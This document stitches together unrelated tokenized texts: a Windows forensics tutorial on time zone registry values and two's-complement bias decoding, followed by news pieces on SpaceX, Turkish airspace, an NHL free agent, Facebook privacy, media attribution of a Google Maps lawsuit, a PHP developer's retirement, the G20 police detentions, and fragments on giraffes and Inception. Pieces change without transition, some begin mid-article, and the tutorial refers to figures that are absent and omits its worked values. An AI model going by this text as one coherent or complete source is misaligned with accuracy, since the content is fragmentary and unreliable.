Many of the Date / Time stamps store the data as UTC values .
In such circumstances , the Operating System ( or application ) has to convert the value from Local time to UTC .
Case Example
This was demonstrated in a case I was asked to review a number of years ago .
A computer had been seized as part of an investigation into abusive images of children .
The police had examined the computer correctly and the individual involved had been charged with offences under the Protection of Children Act 1978 .
A defence expert examined the forensic image from the computer had declared in his report that the police had tampered with the evidence and alleged that they were responsible for the illegal material as the Date / Time stamps show the material was created on the disk some four hours after it had been seized by police .
My initial examination revealed that the defence expert had not established the Time Zone settings for the system nor had he taken them into account during his examination and subsequent report .
If he had , he would have seen that the system was incorrectly set to Pacific Time and not GMT .
As far as the Operating System was concerned , the system was in Pacific Time and added 8 hours to the Local times to convert them to UTC .
This resulted in the Date / Time stamps being 8 hours in advance of the correct time .
When the defence expert stated the computer had illegal material written to the disk after the system was seized , it was in fact that this had happened some 4 hours prior to the warrant being executed at the home of the suspect .
Establishing the Current Time Zone
To establish the Time Zone setting for a Microsoft Windows system , the forensic examiner can examine the SYSTEM registry hive .
To do this , you need to establish which ControlSet was active when the computer was seized .
Figure 1
There you will find 4 keys detailing the Current , Default , Failed and LastKnownGood control sets .
The current control set in the screen below is set to 3 .
You can also see the there are three ControlSets numbered 001 to 003 .
Figure 2
Now that this current control set has been identified , we can navigate to that location in the registry and calculate the different values as stored .
In this case , the Time Zone settings are stored here :
Figure 3
The Time Zone Information for this Control Set is shown in Figure 4 .
Figure 4
The keys are explained below .
Please note that the bias settings are stored in minutes as a signed integer .
The bias is the difference , in minutes , between UTC and local time .
All translations between UTC and local time are based on the following formula :
Figure 5
ActiveTimeBias
This value is the current time difference from UTC in minutes , regardless of whether daylight saving is in effect or not .
It is this value that helps establish the current Time Zone settings .
Using the formula above , take this value and add it to local time to get the UTC value .
Bias
This value is the normal Time difference from UTC in minutes .
This value is the number of minutes that would need to be added to a local time to return it to a UTC value .
This value will identify the Master Time Zone ( Standard Time ) .
StandardBias
This value is added to the value of the Bias member to form the bias used during standard time .
In most time zones the value of this member is zero .
DaylightBias
This value specifies a bias value to be used during local time translations that occur during daylight time .
This value is added to the value of the Bias member to form the bias used during daylight time .
In most time zones the value of this member is – 60 .
DaylightName
The Operating System uses this name during daylight saving months to display the current time Zone setting .
DaylightStart
Binary data in SYSTEMTIME structure used to identify the date / time that Daylight Saving will commence in this time zone .
StandardName
The Operating System uses this name during daylight saving months to display the current time zone setting .
StandardStart
Binary data in SYSTEMTIME format used to identify the date / time that Standard Time will commence in this time zone .
DisableAutoDaylightTimeSet
This will only be visible if the setting to automatically adjust clock for daylight saving has been switched OFF .
Calculating Signed Integer Bias Values
Within digital systems , all data , whether they be numbers or characters are represented by strings of binary digits .
A problem arises when you want to store negative numbers .
Over the years , hardware designers have developed three different schemes for representing negative numbers : sign and magnitude , ones complement , and twos complement .
The most common method for storing negative numbers is twos complement .
With this method , the Most Significant Bit ( MSB ) is used to store the sign .
If the MSB is set , then this represents a NEGATIVE number .
This method affords natural arithmetic with no special rules .
To represent a negative number in twos complement notation the process is simple :
• Decide upon the number of bits ( n )
• Find the binary representation of the +ve value in n-bits
• Flip all the bits ( change 1 to 0 and vice versa )
• Add 1
Figure 5 below shows the binary representation of the positive number 5 .
Figure 5
To represent this as a negative number ( using 8 bits ) then the procedure above is followed .
Flip the bits as shown above and add one as shown in Figure 6 .
Figure 6
This method makes it extremely easy to add positive and negative numbers together .
For example :
Figure 7
It also makes it extremely easy to convert between positive and negative numbers :
Figure 8
ActiveTimeBias
If we look once again at the ActiveTimeBias in Figure 9 , you will see a signed hexadecimal value .
This can be calculated using twos complement .
Figure 9
This value is stored in hexadecimal as a 32 bit value , so to work out the value it will need to be converted to binary .
Ignore the fact that on this occasion , the registry editor is showing the decimal value ( 4294967236 ) next to it ; this is purely because the registry editor does not realise the value has been stored as a signed integer .
The twos complement calculation is as follows :
Convert this to binary :
The MSB is set so we know that the above value will be negative .
The next stage is to flip all the bits .
This involves changing 1 to 0 and vice versa .
This can be achieved quickly using the logical NOT function on a scientific calculator .
You must ensure that it is set to deal with the correct number of bits .
Add 1 bit to the value above
And then convert that value back to decimal , remembering that we are dealing with a negative number :
Daylight Saving / Standard Time Start Dates
Looking at Figure 10 below , you can see two keys entitled DaylightStart and StandardStart .
They hold encoded data showing the exact commencement date / time of Daylight Saving and Standard Time .
To establish when daylight saving starts and ends , both keys will need to be decoded .
Figure 10
SYSTEMTIME Structure
This data is stored in a common structure called SYTEMTIME .
This structure specifies a date and time , using individual members for the month , day , year , weekday , hour , minute , second , and millisecond .
Figure 11
The data in DalylightStart is as follows :
Figure 12
Bytes 0 & 1 ( 0x0000 ) refer to the year from a 1900 time base .
This is only required if the change is year specific and will normally be zero .
Bytes 2 & 3 ( 0x0003 ) refer to the month , in this case March .
Bytes 4 & 5 ( 0x0005 ) refer to the week ( starts at 1 and 5 means last ) .
In this case the last week .
Bytes 6 & 7 ( 0x0001 ) refer to the Hour .
In this case it is 0100 Hours .
Bytes 8 & 9 ( 0x0000 ) refer to the Minutes .
In this case it is Zero minutes .
Bytes 10 & 11 ( 0x0000 ) refer to the Seconds ; in this case it is Zero seconds .
Bytes 12 & 13 ( 0x0000 ) refer to the Milliseconds , in this case it is Zero milliseconds .
Bytes 14 & 15 ( 0x0000 ) refer to the actual Day of the Week ( Sunday = 0 ) .
In this case it is Sunday
For our example in Figure 12 , Daylight Saving Time ( DST ) will start on Sunday of the Last Week in March at 0100 Hours .
If we had decoded StandardStart , we would see that DST would end on Sunday of the last week of October at 0200 hours .

Marking a milestone in commercial space travel , Space X has launched its privately built Falcon 9 rocket from Cape Canaveral .
Update at 2:49 p.m. ET : The rocket has successfully separated , sending the second stage into space .
Update at 2:55 p.m. ET : The Falcon 9 was built by Space X , or Space Exploration Technologies , which was founded eight years ago by Elon Musk , a South African - born entrepreneur who co-founded PayPal and now runs electric - car maker Tesla Motors .
The rocket is carrying a mock - up of the company 's spacecraft , named Dragon .
The goal is to put the capsule into orbit .
The successful liftoff this afternoon came after the initial launch was aborted in the last final second earlier in the day .
NASA hopes to use the Falcon - Dragon combo for hauling cargo and possibly astronauts to the International Space Station , once the shuttles stop flying , the Associated Press reports .
The first supply run could come next year .
( Posted by Doug Stanglin )
Update at 4:41 p.m. ET : NASA contacted USA TODAY to clarify that the launch was handled entirely by Space X , so we 've tweaked the headline and the post to remove references that the government space agency launched the rocket .
BTW , the capsule has reached orbit successfully .

( CNN ) --
Turkey has clamped down on Israel 's use of its airspace , according to a statement from the Turkish prime minister and information from a Turkish government official .
Turkish Prime Minister Recep Tayyip Erdogan said Monday that his country 's airspace had been closed to Israeli aircraft in the wake of the Israel 's May raid on a Turkish ship that was part of a Gaza aid flotilla .
Nine Turkish activists were killed in the raid , which has caused an epic rift between the two countries .
But the government official , who declined to be identified , told CNN that " this is not exactly the ( complete ) closing down of Turkish airspace . "
All civilian flights are continuing , the official said .
" With regard to military flights , the normal procedure is that for each ... flight countries , must ask for permission to use Turkish airspace .
It is evaluated on a case - by - case basis .
It is true that one Israeli flight was not allowed into Turkish airspace .
...
Any
future military flights will also be evaluated on a case - by - case basis . "
The official did not give on details on the origin or destination of the flight that had been turned away .
Israeli officials have defended the legality of the May raid and criticized those aboard the ship for attacking the boarding party .
Israeli Transportation Minister Israel Katz said Monday that the country 's planes would continue as usual with takeoffs and landings on flights between the two countries .
It ’s another day of wait and see for a decision from unrestricted free agent Ilya Kovalchuk .
Kovalchuk ’s agent , Jay Grossman , tweeted yesterday that Kovalchuk was “ looking ” to make a decision .
One never came though , and around 8 p.m. last night Grossman announced that Kovalchuk had narrowed his decision but would n’t make a decision last night .
It seems as if the Devils may be the only team in the running for Kovalchuk ’s services .
The Kings have dropped out of the sweepstakes , and the Islanders have never made a serious play at the left - winger .
While the Devils do n’t have the money to give Kovalchuk the 10 year , $ 100 million dollar deal he ’s reportedly seeking , general manager Lou Lamoriello is confident that money wo n’t be an issue .
“ There ’s enough there , ” he said to Tom Gulitti of the Bergen Record .
“ Do n’t worry about my cap . ”
Update ( 6:10 p.m. )
No word yet out of the Kovalchuk camp .
I wish he ’d hurry up and make a decision already .
As always , continue to check The Devils ’ Den for all your Kovalchuk updates throughout the day .
The interview comes after the 26 - year - old paper billionaire announced changes to simplify Facebook 's privacy settings , which was hailed as a big step in the right direction but still criticised for keeping some sharing of personal information opt - out rather than opt-in .
Last month , 30 European countries wrote a letter to Facebook complaining about its privacy settings while 15 consumer groups complained to the US Federal Trade Commission .
The Australian Privacy Commissioner , Karen Curtis , is also investigating .
" There have been misperceptions that we are trying to make all information open .
That 's completely false , " he said .
This seems to conflict with a series of changes Facebook has made over the years that automatically made users ' information public without their consent .
Zuckerberg dodged questions about the authenticity of leaked chat logs from his Harvard days that appear to show he called users who trusted him with their information " dumb f---s " .
" When I was 18 or 19 years old , I did a lot of stupid things .
I do n't want to make an excuse for that .
I 'm really sorry that I did them , " he said .
In the interview at the conference , conducted by The Wall Street Journal 's Walt Mossberg and Kara Swisher , Zuckerberg pointed to the initial opposition to the now ubiquitous " news feed " in rejecting a suggestion that all Facebook settings should be " opt-in " .
" There 's some serendipity that can only happen if you are sharing , " he said .
Zuckerberg said pushing the boundaries on other aspects of Facebook , such as a new " instant personalisation " feature that automatically shares users ' personal data with websites such as Pandora and Yelp , was part of what made Facebook such an innovative company .
" Certainly on a day - to - day basis if we did n't disrupt things , that would be the easiest way to proceed , " Zuckerberg said .
" But we do n't believe that if we did that we'd be doing the best thing for us long term or for the industry . "
He said Facebook would continue to make what it believed were the right changes , even if some of them were controversial .
Colin Jacobs , chairman of the online users ' lobby group Electronic Frontiers Australia , is n't drinking the Facebook Kool - Aid , saying privacy settings were still " a bit loose " and criticising the instant personalisation feature as being at odds with Facebook 's policy of giving users control of their information .
" If Facebook was a country , its population would be 20 times larger than Australia's , and Facebook is learning the hard way that a lot of care must be taken with the information of so many citizens , " he said .
" We hope Facebook have learnt a lesson from the recent outcry , and decide to stay truer to their publicly stated principle of giving users full control over their information . "
Zuckerberg said that more than 200,000 websites now used the company 's social " plug-ins " , which allow Facebook users to click on buttons across the web to show that they " liked " a particular online article or video .
Loading " I do n't know if we always get it right , " Zuckerberg said .
" But my prediction will be that a few years from now , we 'll look back and wonder why there was ever this time when all these websites and applications ... were n't personalised in some way . " - with Reuters
On Friday , I broke a tasty story about a woman suing Google , claiming bad directions caused her to get hit by a vehicle .
Today , I discover our story is everywhere , often with no attribution .
Come along and watch how the mainstream media , which often claims bloggers rip it off , does a little stealing of its own .
Woman Follows Google Maps “ Walking ” Directions , Gets Hit , Sues was the story I posted on Friday afternoon , Pacific Time .
I was tipped to the lawsuit by Gary Price of ResourceShelf .
Gary had n’t written about it himself but thought Search Engine Land would be interested in it .
He came across it through the regular monitoring of search - related news that he does across a variety of resources ( Gary watches many , many things — he ’s a research guru extraordinaire ) .
Gary downloaded a copy of the suit via the PACER Service and sent it to me .
No one had written about the case before I put my article up .
I know .
I checked before publishing .
There was nothing out there .
So what happened next ?
I ’ll Steal Your Image , But I Wo n’t Link To You
Let ’s start with the Daily Mail ’s story here .
We get no attribution , but I know they found the story from us .
My evidence ?
They ’re using a screenshot I made , without my permission and without credit .
It ’s a screenshot of the route from Google Maps .
Sure , the Daily Mail could have generated their own route using Google Maps .
But , they did n’t .
“ Their ” image is cropped exactly the same as mine and includes an arrow I added to point to a warning on Google Maps .
Since the image was created by me , for Search Engine Land , and is a transformation of the original Google “ work , ” the copyright that the Daily Mail is violating belongs to Search Engine Land .
Postscript :
There ’s some debate in the comments on whether altering a Google screenshot as I did provides me with a copyright .
Let ’s say it does n’t .
That still does n’t excuse the Daily Mail in my books for just taking the picture without any credit at all .
Common courtesy still has a place .
The Financial Post does the same thing , uses my exact image — so they had to have seen my story — but they do n’t bother to link over or provide attribution .
Postscript : Jameson Berkow from the Financial Post got in touch soon after I posted my story to apologize , saying there was originally a link to our article in his piece but which got lost along with other links through some technical glitch ( which I can totally understand happening .
I ’ve lived through those myself ) .
When he fixed the missing links , ours got overlooked accidentally but now has been restored .
I ’m also good with the usage of our illustration , since the article links over to me .
I ’ll Link To Your Source Document , But Not You
Over at PC World , a different twist .
Rather than link to my story , they linked to the source documentation — the lawsuit — that I uploaded to my personal Scribd account .
I created this account on Friday , so it ’s not something you ’d just stumble upon in the course of independent news gathering .
Maybe PC
World saw someone else linking to it and so never saw my story .
Maybe .
Then again , as part of the news reporting process , I think tracking down originating sources is important .
Where did this document come from ?
The Scribd file links over to my original story .
If you wanted to backtrack the origin of this document ( say , perhaps , to know if it was actually real ) , you ’d probably head over to my story .
Either PC
World did this , and did n’t think credit was necessary , or it failed to fully fact check the story .
Postscript : PC
World has added a link now , thanks , and the author commented about coming across my story after finding other ones about it .
By Omission , Someone Else Becomes The Source
Regardless of how it happened , the PC World story is an example of something else , how a second party can become the originating source .
That PC World story ?
CBS
News cited it as the source for its own story .
That , again , makes you question some of the news reporting that is supposed to go on by the mainstream media .
The reporting , that accounts often say , blogs themselves fail to do .
CBS simply seems to have summarized the PC World story , ending with a link to PC World plus a link to the complaint itself — the complaint I uploaded .
Clearly no one tried to track down the complaint ’s origin more .
No apparent attempt to independently verify if the case was real .
( FYI , unlike CBS , I actually did call the legal firm in the case on Friday ) .
That CBS story also flowed out to affiliated CBS news stations , such as here and here .
Postscript : CBS , after seeing this , added a link — thanks !
Over at the Atlantic Wire , PC World again gets cited , but not us .
News.com also is cited in that Atlantic Wire round - up of commentary on the case .
Despite the fact News.com prominently links to us ( thanks ! ) , that does n’t make it into the Atlantic ’s story .
Postscript :
They ’ve since added a link , thanks !
Time Magazine also does the same , linking to the Scribd document and the PC World story .
Postscript :
They ’ve since added a link , thank you .
AOL News did similarly , linking to the complaint — which was almost certainly found by reading our story — but not to our story itself .
As a result , places like the New York Daily News , nineMSN and The Register cite AOL News as the source .
Postscript : AOL has since added a link , thanks !
It ’s not just mainstream media that screwed up , however .
Even Gizmodo , a well known tech blog , overlooked us .
They linked to Fortune , which in turn linked to us .
But we did n’t get a mention at Gizmodo .
Postscript : Originally I ’d had written further below : Semi - thanks to Gizmodo .
They linked to Fortune , which linked to us .
But hey Gizmodo , next time , show a brother - blog some love and give us a direct link .
It came up in comments that this was being too soft on Gizmodo , compared to some of the mainstream publications that I dinged for linking to an intermediary source .
I agreed , explained why this happened and have changed the story to ding them properly .
Having said that , about an hour after this story when live , Gizmodo added us as a source like this : [ Search Engine Land via Fortune ]
I ’ve often seen them show the story trail across multiple sources this way , which I think is well done .
Want to see attribution done right ?
Over at Inc , they appared to have spotted the PC World story first .
But further down , there ’s this :
First reported by SearchEngineLand
Thanks !
And thanks to others who linked , including :
The News , It Just Sprang From Our Forehead
Though I ’m a traditionally trained reporter , most of my journalism has been online , where documenting how a story has been found is both easily done ( through links ) and often done .
Bloggers generally explain how they discovered a news item .
As a result , bloggers also set themselves up for accusations that they ’ve just “ ripped off ” some traditional news outlet .
By carefully listing an originating source , and sometimes a “ via ” source , they expose how news flows .
In contrast , a traditional media outlet typically does not document how a story came to life .
It ’s all a mystery .
News just seems to emerge magically out of thin air in the middle of a newsroom .
Or , it ’s down to all those hard - working reporters out there defending democracy despite newspapers earning less these days because of all those rip - off bloggers .
For example , the Salt Lake Tribune published the Google Maps story yesterday , three days after our story went up .
How did the paper discover the news ?
In a lawsuit filed last week in U.S. District Court for Utah …
Well , lawsuits are public .
Newspapers regularly check on them , in their areas .
In fact , that ’s exactly what Tribune reporter Chris Smart told me , when I called him today to ask about the origin of his story .
Smart said the Tribune has a federal courts reporter who checks for filings each day .
I used to work for daily newspapers .
I know courts reporters do this .
But our story went up late on Friday afternoon Pacific time .
How come the Tribune did n’t have its own story then ?
A full day had passed from when the case was filed to when it could have been written up .
But it was n’t .
Did the reporter come in on Saturday , Sunday or Monday — over a holiday weekend — and check the records ?
There was some discussion between Chris and someone else in the newsroom , then I was handed over to the federal courts reporter herself .
She eventually said that someone in the newsroom heard a rumor about this case , and she was called in to help locate it on Monday using the PACER system .
Now let ’s imagine how the Tribune ’s story would have looked , if that fact had been reported :
After hearing a rumor about a case involving Google Maps , which someone saw on TV or read on a blog or we do n’t really know where , we checked court records ourselves to find the case which says … .
Whatever rumor the Tribune heard , which finally got them to cover a story three days late in their own backyard , that rumor started with our story .
Despite this , the Tribune became the originating source as cited by places such as About.com , the San Francisco Business Times and elsewhere .
Postscript : The SF Business Times , after seeing this , kindly added a link !
Beyond the Tribune , there are plenty of other places where the story was apparently just discovered out of the blue , including :
I especially like how this happens over at The Sun .
The story there , by “ Staff Reporter , ” gives no clue about how a British tabloid owned by News Corporation came across a story that happened over 5,000 miles away .
Wire report ?
Saw it on a blog ?
Is there a Sun reporter based in Park City , Utah ?
We ’ll Cite You , But Not Link To You
Mashable reported on our story , and like a reputable blog , they linked to us .
But Mashable ’s content appears to be syndicated into places like the Sydney Morning Herald — and our link got dropped in that .
That ’s bad for us , as we lose traffic .
It ’s also bad for Sydney Morning Herald readers , who may want to read our original story .
Postscript :
They ’ve since added a link , thank you .
Related to this , both Fox News Memphis and Fox News LA cite Mashable for their story , which makes me think all Fox News affiliates are sharing this piece .
Since Mashable is credited , was it too hard to cite Search Engine Land as the original source ?
Postscript :
The story has since added a link , thanks !
The Salt Lake Tribune also gets cited , which underscores a point I made earlier .
Instead of original reporting going on , plenty of mainstream publications are happy to simply “ echo chamber ” a story that originated on a blog in the same way that blogs are often accused of doing to mainstream publications .
And Now , It ’s From The AP
The Associated Press has filed on the story .
Here ’s the entire thing so far ( the story will no doubt grow as they do more reporting ) .
I ’m going to reprint the entire thing .
I feel this is allowed by fair use , as it ’s required to show the entire story in order to fully comment about it :
PARK CITY , Utah ( AP ) —
A woman who says she relied on Google for walking directions in Utah that got her hit on a major roadway has filed a lawsuit against the Internet company claiming it supplied unsafe directions .
Lauren Rosenberg filed the $ 100,000 lawsuit Thursday in U.S. District Court in Utah .
It also names a motorist she says hit her .
A Google spokeswoman also did not return a message from The Associated Press seeking comment .
Rosenberg says she used her BlackBerry to download walking directions from Google Maps between two Park City addresses .
The Los Angeles County resident claims the directions led her to walk through Park City on a road without sidewalks that she says is n’t safe for pedestrians .
Rosenberg could n’t be reached Tuesday .
Her attorneys did not return messages .
As with the Tribune , where ’s the information about how the AP discovered this story ?
Did the reporter come across someone else writing about it ?
If so , how about a credit ?
And if so , did they actually pull the case itself from PACER ?
Or did they download the document I put out there , like many others seem to have done ?
Speaking of the Tribune , that paper is owned by MediaNewsGroup , which is led by Dean Singleton , who is also chairman of the Associated Press .
Singleton and the AP have been vocal that blogs often rip them off for news content .
My Do Newspapers Owe Google “ Fair Share ” Fees For Researching Stories ?
story has another example of a story that emerged from blogs and into the AP wire without attribution .
I think that if the AP or traditional publications like the Salt Lake Tribune documented exactly how they “ found ” news in the way blogs do , there ’d be a fair reassessment of just how much flows back and forth .
It ’s not all a one way street , from traditional news outlets to blogs .
Ca n’t We All Get Along ?
That brings me back to another piece I wrote last year , Blogs & Mainstream Media : We Can & Do Get Along .
I ’d like to see a lot less finger - pointing and much more acknowledgment that the origin of news is a messy business .
So why am I pointing fingers in this case ?
To help keep things even .
I think it ’s very well known how traditional sources get cited by alternative ones .
But while the opposite is true , that ’s a story that ’s rarely illustrated .
I ’ll also add that I know mistakes and misunderstandings can happen with attribution .
I try to get it right , but I know I ’m not perfect .
I also know there are times we ’ve reported on a story , credited someone else but nonetheless ended up as a originating source .
News is messy .
But we should all try to do better attribution .
Postscript : Aside from the fairness of attribution , linking to sources brings those sources support with traffic .
Our story at Search Engine Land has had 30,000 page views just from being mentioned in the Toronto Star ’s write - up .
If other places like the Daily Mail or the Sun had linked , we ’d have even more visitors , which is important to a relatively small publication .
My Thanks For The Link , Mainstream Media — Now Let ’s Have More !
post from 2007 has more thoughts on wanting to see more mainstream linking .
A few days ago I announced my retirement from PHP core via twitter and the internals mailinglist .
Actually I have always felt a bit weird calling myself being part of " PHP core " since in all the years I have never added any code to core , actually I have only removed some code as it was being moved to PECL .
Anyway whatever you wanna call it , I ended up in a position where I could participate in many core decisions and finally even helping Johannes RMing 5.3 together for about a year .
And like most open source developers I did what I did because I personally cared about the project and enjoyed being part of something that helps so many people in the world .
Obviously it also helped my career and my employer in many ways .
So all in all I put in time and I got a lot of things in return .
So what exactly did I contribute over the years ?
As I stated above it was n't code , though I did contribute various ideas that in the end where implemented by other core developers .
But I guess my main contribution was things like the todo lists , the wiki , RFCs , efforts like the TestFest which all led to the point where I have become trusted enough to handle the organizational aspects of the PHP 5.3 RMing job .
Of course I cannot solely claim these were only my contributions .
For example while I started the todo list many core devs updated the todo list themselves .
The wiki would obviously be nothing without others adding content to it and someone setting up the server etc .
The RFC section is obviously modeled after Stefan Marr 's traits proposal .
Also I actually did a shitty job on the TestFest in the first year , but many enthusiastic people made it a success none the less and others have grown the initial idea over the years .
So I am only claiming that I played a role on the above mentioned things .
But I think I can be proud of what I have brought to the project and these additions now seem to be quite accepted in the project , so they will continue to evolve .
Through out all of the things I did my main vision was to increase transparency of what is happening within the project .
Otherwise ideas get lost , new developers have no idea where to turn , end users have no idea of where things are heading etc .
A key aspect here imho is that stuff like processes and discussions need to be documented .
Obviously common sense stands above everything else , but I think its important to consciously deviate from the defined path instead of coming up with everything ad hoc .
But PHP traditionally has had a bit of a paranoia that structured development would make the project boring and feel like work rather than fun .
It always seemed weird to me that a language who 's main feature was low barrier to entrance was making participation in the development process so seemingly hard .
Like the wiki idea was resisted for years because it was said that files in CVS were better , but imho its simply not convenient for developers and even less so for end users .
Where is the fun in inconvenience ?
At the same time PHP is an incredibly successful projects and has been long before me and PHP would be just as important today if I would never have come along .
So when I argue in favor of short release cycles with a defined list of high profile features to be planned in advance in order to better focus resources and more importantly reduce the time between a code contribution and the accompanying release , then I have to realize that I am proposing a change to something to a process that has led PHP to the top of the web programming hill .
Of course I have stubbornly argued in favor of change in the past , some of these changes have come about and have improved things .
But it always seemed like a battle and every battle has its risks if just the time lost to all parties to participate in the battle .
Also I think few people actually enjoy such battles but open source needs to be fun .
At this point I just feel that if I continue to fight for the kinds of changes I want , then I feel that the harm from fighting is too great relative to the potential gains of these changes .
But at the same time the status quo is no fun for me .
To me 99 % of what I did as PHP 5.3 RM was totally unnecessary if we would just structure our processes more .
Where is the fun in that ?
I am know I am not alone in this perception , but I also feel like I constantly justified my arguments by speaking on behave of " silent masses " .
But why are n't these silent masses not speaking up .. maybe because they do not exist ?
So I guess the conclusion is that I simply do not enjoy donating my spare time given the current status quo and I also do not feel like the things I want to change so that things would be fun again are worth the risk .
The only logical step , which I have been debating with myself since last summer , is to leave the project .
I guess with the time saved I will have more time for other projects I care about like Symfony , Doctrine , un-informed.org and learning about new database technologies .

LONDON ( Reuters ) - Web search group Google Inc is phasing out internal use of rival Microsoft Corp ’s Windows operating system because of security concerns following a Chinese hacking incident , the Financial Times reported on Tuesday .
Citing several Google employees , the FT said the decision to move to other operating systems including Apple Inc ’s Mac OS and open - source Linux began in earnest in January after Google ’s Chinese operations were hacked .
Internet security firm McAfee Inc said at the time the cyber attacks on Google and other businesses had exploited a previously unknown flaw in Microsoft ’s Internet Explorer browser , which was vulnerable on all recent versions of Windows .
The FT quoted one Google employee as saying : “ We ’re not doing any more Windows .
It is a security effort . ”
Another said : “ Getting a new Windows machine now requires CIO ( chief information officer ) approval . ”
Google said in a statement : “ We ’re always working to improve the efficiency of our business , but we do not comment on specific operational matters . ”
Google , which already offers e-mail , Web and other software products that compete with Microsoft ’s offerings , is developing its own operating system based on its Chrome browser .
It will initially target netbooks , or inexpensive , pared - down notebook PCs .
Microsoft Windows runs about nine out of 10 of the world ’s personal computers .
Dr Naish said : " Our models show that while it 's feasible for a giraffe to swim , it is much harder than it is for a horse .
It is fair to say that giraffes might be hesitant to enter the water knowing that they are at a decided disadvantage compared to being on solid ground . "
Miss Lorenzana said she yearned to be uglier .
" If being less good - looking means being happy and finding love and not being sexually harassed and having a job where no one bothers you and no one questions you because of your looks then , definitely , I 'd want that .
I think of that every day . "
So the big question : when Cobb finally gets back to his kids , is it reality or a dream ?
The top spinning at the end is the Schrodinger ’s cat paradox .
Without seeing it fall , but having evidence it might , we are left with the fact that Cobb ’s world is simultaneously a dream and reality .
More importantly , Cobb ’s action to walk away without confirming the top ’s fall is the true point .
The confirmation of reality does n’t matter .
Just as Fisher is told a lie in the dream ( that dad loved him and wanted him to be his own man ) , we learn that a well meaning delusion is much more valuable than a bleak reality and neither is more real than the other .
Fisher ’s new life based on his father ’s approbation will lead to some very real consequences , even if those consequences are limited to Fisher rectifying his relationship with his father .
He is no longer trapped by a perception of what his father wanted .
No longer trapped by the perception he disappointed his father and thus must work to ( though he never really could ) live up to the dead man ’s standards .
Cobb had a commitment to the real world when Mal was alive , which is why he tricked her to snap her back into the real world .
But once Cobb has his catharsis with Mal in limbo , he realizes that even objective reality is n’t necessarily the most important thing .
Remember , early in the film , Cobb spin the totem in “ reality ” , such as it is , and leans a gun against his head .
He ’s planning to shoot his brains out if the top does n’t stop spinning .
That is how paranoid and obsessive he is .
What he does n’t yet know is it does n’t matter .
Cobb ’s guilt over his wife plagued him whether he was in a dream or in reality .
It ’s that guilt that truly kept him from his kids , not the charges .
Many other writers have noted there was a bunch of ways Cobb could have got back to his children , even convincing grandma to bring them to Europe .
He could have found other ways , but the fact was he could n’t face his kids , not even in a dream , due to his guilt .
In the end , in absolving himself of the guilt , Cobb realizes it ’s rectifying your inner reality , not the outer one , which is most important .
With this movie we get bogged down by questions of what is and what is n’t concrete reality and that is all beside the point .
It ’s only the reality of one ’s own mind that matters .
The reality you believe to be is the only reality that exists .
And that ’s why he walks away from the spinning top at the end .
Cobb knows full well totems are n’t reliable , he used one to trick Mal .
He could easily create a dream concept of a totem that can fall .
In the end he chooses his kids ( i.e. he chooses to move on ) over the certainty of the totem .
Wherever he is , his inner turmoil is over , and that ’s the most reality he can hope for .
By letting the haunting memory of his wife go , he has become truly “ awake , ” whether he is in a dream or not .
Just saw Inception last night , but my theory is fully half - baked .
Overwhelmingly , Americans think the nation needs a fundamental overhaul of its energy policies , and most expect alternative forms to replace oil as a major source within 25 years .
Yet a majority are unwilling to pay higher gasoline prices to help develop new fuel sources .
Those are among the findings of the latest nationwide New York Times / CBS News poll .
The poll , which examines the public ’s reaction to the oil leak in the Gulf of Mexico , highlights some of the complex political challenges the Obama administration faces .
For instance , despite intense news coverage and widespread public concern about the economic and ecological damage from the gulf disaster , most Americans remain far more concerned about jobs and the nation ’s overall economy .
And in that regard , President Obama does not fare well : 54 percent of the public say he does not have a clear plan for creating jobs , while only 34 percent say he does , an ominous sign heading into this fall ’s midterm elections .
Respondents were nearly evenly split on the president ’s handling of the economy  45 percent approve , 48 percent disapprove .
His job approval rating remains just below 50 percent .
And by a nearly 2 - to - 1 margin , Americans think the country is on the wrong track .

John Pruyn was n’t much in the mood for celebrating Canada Day this year .
How could he be after the way he was treated a few days earlier in Toronto by figures of authority most of us were brought up to respect , our publicly paid - for police forces who are supposed to be there to serve and protect peaceful , law - abiding citizens like him .
The 57 - year - old Thorold , Ontario resident – an employee with Revenue Canada and a part - time farmer who lost a leg above his knee following a farming accident 17 years ago – was sitting on the grass at Queen ’s Park with his daughter Sarah and two other young people this June 26 , during the G20 summit , where he assumed it would be safe .
As it turned out , it was a bad assumption because in came a line of armoured police , into an area the city had promised would be safe for peaceful demonstrations during the summit .
They closed right in on John and his daughter and the two others and ordered them to move .
Pruyn tried getting up and he fell , and it was all too slow for the police .
As Sarah began pleading with them to give her father a little time and space to get up because he is an amputee , they began kicking and hitting him .
One of the police officers used his knee to press Pruyn ’s head down so hard on the ground , said Pruyn in an interview this July 4 with Niagara At Large , that his head was still hurting a week later .
Accusing him of resisting arrest , they pulled his walking sticks away from him , tied his hands behind his back and ripped off his prosthetic leg .
Then they told him to get up and hop , and when he said he could n’t , they dragged him across the pavement , tearing skin off his elbows , with his hands still tied behind his back .
His glasses were knocked off as they continued to accuse him of resisting arrest and of being a “ spitter , ” something he said he did not do .
They took him to a warehouse and locked him in a steel - mesh cage where his nightmare continued for another 27 hours .
“ John ’s story is one of the most shocking of the whole ( G20 summit ) weekend , ” said the Ontario New Democratic Party ’s justice critic and Niagara area representative Peter Kormos , who has called for a public inquiry into the conduct of security forces during the summit .
“ He is not a young man and he is an amputee . ….
John is not a troublemaker .
He is a peacemaker and like most of the people who were arrested , he was never charged with anything , which raises questions about why they were arrested in the first place . ”
Pruyn told Niagara At Large that he never was given a reason for his arrest .
When he was being kicked and hand - tied , police yelled at him that he was resisting arrest .
Then a court officer approached him two hours before his release on Sunday evening , June 27 , and told him he should not still be there in that steel - mesh cage .
So why were Pruyn and his daughter Sarah , a University of Guelph student , who was locked up somewhere else , detained in a makeshift jails for more than 24 hours , along with many other mostly young people who , so far as he could hear and see , had nothing to do with the smashing of windows and torching of a few police cars by a few hundred so - called ‘ Black Bloc ’ hooligans that weekend ?
Why was Pruyn slammed in a cell without his glasses and artificial limb , with no water to drink in the heat for five hours and only a cement floor to sit and sleep on before his captors finally gave him a wheelchair ?
Why was he never read his rights or even granted the opportunity to make one phone call to a lawyer or his family – the same rights that would be granted to a notorious criminal like Clifford Olsen or Paul Bernardo ?
He never received an answer to these questions and , he said , “ I was never told I was charged with anything . ”
Neither were many of the others who were penned up in that warehouse with him , including one person who was bound to a wheelchair because was paralyzed on one side and begging , over and over again , to go to the washroom before finally wetting his pants .
Pruyn said others in the warehouse begged for a drink of water and younger people made futile pleas to call their parents to at least let them know where they were .
In the meantime , Pruyn ’s wife , Susan , was frantically trying to find out from the police and others what happened to her husband and daughter .
She found out nothing until they were finally released 27 hours after she was supposed to meet back with them at a subway station near Queen ’s Park .
